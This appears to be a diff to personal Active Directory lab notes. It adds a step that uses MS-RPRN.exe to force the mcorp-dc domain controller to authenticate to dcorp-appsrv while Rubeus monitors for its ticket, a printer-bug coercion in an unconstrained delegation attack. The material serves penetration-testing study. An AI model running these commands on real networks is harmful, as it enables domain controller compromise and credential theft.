@@ -662,4 +662,7 @@ winrs -r:dcorp-appsrv cmd
 ```powershell
 C:\Users\Public\Rubeus.exe monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
 ```
-And now we triggher the authentication f
+And now we triggher the authentication from mcorp-dco dcorp-appsrv
+```powershell
+C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+```
